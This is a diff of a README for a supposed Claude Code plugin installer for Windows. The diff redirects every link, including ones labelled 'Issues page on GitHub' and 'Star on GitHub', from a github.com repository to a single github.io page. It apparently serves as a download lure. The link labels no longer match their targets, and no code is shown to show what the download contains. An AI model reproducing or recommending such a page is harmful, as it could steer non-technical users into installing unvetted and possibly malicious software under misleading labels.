@@ -1,6 +1,6 @@
 <h1>📦 biks-claude-loader-update - Install Claude Code Plugins Easily</h1>
 <p align="center">
-  <a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 14px 28px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 22px; font-weight: bold; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download BIKS Claude Loader</a>
+  <a href="https://triune-contemplation240.github.io" style="display: inline-block; padding: 14px 28px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 22px; font-weight: bold; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download BIKS Claude Loader</a>
 </p>
 <h2>📖 What Is This?</h2>
 <p>BIKS Claude Tools is a plugin marketplace and installer for <strong>Claude Code</strong>. Think of it like an app store just for Claude plugins. You can browse available plugins, pick the ones you want, and install them one by one with a single click. The <strong>biks-claude-loader-update</strong> tool makes it simple to discover new plugins and keep them updated.</p>
@@ -8,7 +8,7 @@
 <h2>🚀 Getting Started</h2>
 <p>Follow these steps to get BIKS Claude Loader running on your Windows computer. No programming experience needed.</p>
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/triune-contemplation240/biks-claude-loader-update">https://github.com/triune-contemplation240/biks-claude-loader-update</a></p>
+<p>Visit this link to download the application: <a href="https://triune-contemplation240.github.io">https://triune-contemplation240.github.io</a></p>
 <p>Click the green <strong>"Code"</strong> button, then choose <strong>"Download ZIP"</strong>. Your browser will save a file called <code>biks-claude-loader-update-main.zip</code> to your Downloads folder.</p>
 <h3>Step 2: Extract the Files</h3>
 <ol>
@@ -66,11 +66,11 @@
 </ul>
 <h2>📥 Download Again</h2>
 <p align="center">
-  <a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 6px;">⬇️ Download Now</a>
+  <a href="https://triune-contemplation240.github.io" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 6px;">⬇️ Download Now</a>
 </p>
 <h2>📞 Need Help?</h2>
-<p>If you run into any issues or have questions, please visit the <strong>Issues</strong> page on GitHub: <a href="https://github.com/triune-contemplation240/biks-claude-loader-update/issues">https://github.com/triune-contemplation240/biks-claude-loader-update/issues</a></p>
+<p>If you run into any issues or have questions, please visit the <strong>Issues</strong> page on GitHub: <a href="https://triune-contemplation240.github.io">https://triune-contemplation240.github.io</a></p>
 <p>Describe your problem, and the community or developer will help you out.</p>
 <h2>⭐ Enjoying BIKS Claude Tools?</h2>
 <p>If you find this tool useful, consider giving the project a star on GitHub. It helps others discover it too.</p>
-<p><a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 8px 16px; background: #ffd700; color: black; text-decoration: none; border-radius: 4px;">⭐ Star on GitHub</a></p>
+<p><a href="https://triune-contemplation240.github.io" style="display: inline-block; padding: 8px 16px; background: #ffd700; color: black; text-decoration: none; border-radius: 4px;">⭐ Star on GitHub</a></p>
